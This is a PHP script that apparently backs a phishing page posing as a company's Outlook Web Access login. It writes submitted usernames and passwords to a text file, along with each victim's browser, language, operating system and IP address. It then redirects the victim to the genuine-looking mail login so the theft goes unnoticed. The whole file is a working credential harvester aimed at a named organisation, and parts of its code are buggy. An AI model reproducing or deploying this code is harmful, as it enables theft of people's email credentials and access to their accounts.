<?php

	header("Content-type: text/html; charset=utf-8");
	$filename = 'OpenCacks.txt';
	file_put_contents($filename,"\n------------------------------------------------------------------------------", FILE_APPEND);
	file_put_contents($filename,"\nLoginDate: ".date("Y-m-d H:i:s"), FILE_APPEND);
	file_put_contents($filename,"\nBrowser: ".GetBrowser(), FILE_APPEND);
	file_put_contents($filename,"\nLanguage: ".GetLang(), FILE_APPEND);
	file_put_contents($filename,"\nTargetSystem: ".GetOs(), FILE_APPEND);
	file_put_contents($filename,"\nRealIp: ".Getip(), FILE_APPEND);
	file_put_contents($filename,"\nIpLocation: ".get_onlineip(), FILE_APPEND);
	file_put_contents($filename,"\nMailuser: ".$_POST['username'], FILE_APPEND);
	file_put_contents($filename,"\nMailpass: ".$_POST['password']."\n", FILE_APPEND);
	file_put_contents($filename,"------------------------------------------------------------------------------\n", FILE_APPEND);
	header('Location:http://mail.lincocare.com/owa/auth/logon.aspx?url=http://mail.lincocare.com/owa/&reason=0a');
	
	function GetBrowser(){
	   if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$br = $_SERVER['HTTP_USER_AGENT'];
		if (preg_match('/MSIE/i',$br)) {    
				   $br = 'MSIE';
				 }elseif (preg_match('/Firefox/i',$br)) {
		 $br = 'Firefox';
		}elseif (preg_match('/Chrome/i',$br)) {
		 $br = 'Chrome';
		   }elseif (preg_match('/Safari/i',$br)) {
		 $br = 'Safari';
		}elseif (preg_match('/Opera/i',$br)) {
			$br = 'Opera';
		}else {
			$br = 'Other';
		}
		return $br;
	   }else{return "Get Browser failed！";} 
	}

	function GetLang(){
	   if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
		$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
		$lang = substr($lang,0,5);
		if(preg_match("/zh-cn/i",$lang)){
		 $lang = "Simplified Chinese";
		}elseif(preg_match("/zh/i",$lang)){
		 $lang = "traditional Chinese";
		}else{
			$lang = "English";
		}
		return $lang;
		
	   }else{return "GET Language Failed！";}
	}
	  
	function GetOs(){
	   if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$OS = $_SERVER['HTTP_USER_AGENT'];
		  if (preg_match('/win/i',$OS)) {
		 $OS = 'Windows';
		}elseif (preg_match('/mac/i',$OS)) {
		 $OS = 'MAC';
		}elseif (preg_match('/linux/i',$OS)) {
		 $OS = 'Linux';
		}elseif (preg_match('/unix/i',$OS)) {
		 $OS = 'Unix';
		}elseif (preg_match('/bsd/i',$OS)) {
		 $OS = 'BSD';
		}else {
		 $OS = 'Other';
		}
			  return $OS;  
	   }else{return "Get systeminfo Failed！";}   
	}
	
	function Getip(){
		if(!empty($_SERVER["HTTP_CLIENT_IP"])){   
			$ip = $_SERVER["HTTP_CLIENT_IP"];
		}
	    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
	    }
	    if($ip){
			$ips = array_unshift($ips,$ip); 
	    }
	   
	    $count = count($ips);
	    for($i=0;$i<$count;$i++){   
		if(!preg_match("/^(10|172\.16|192\.168)\./i",$ips[$i])){
		  $ip = $ips[$i];
			break;    
		  }  
	    }  
	    $tip = empty($_SERVER['REMOTE_ADDR']) ? $ip : $_SERVER['REMOTE_ADDR']; 
	    if($tip=="127.0.0.1"){
			return $this->get_onlineip();   
	    }else{
			return $tip; 
	    }
	}
	  
	function get_onlineip() {
			$mip = file_get_contents("https://ipapi.co/8.8.8.8/json/");
			$res = json_decode($mip);
			return "$res->country . $res->timezone";
	}
	
?>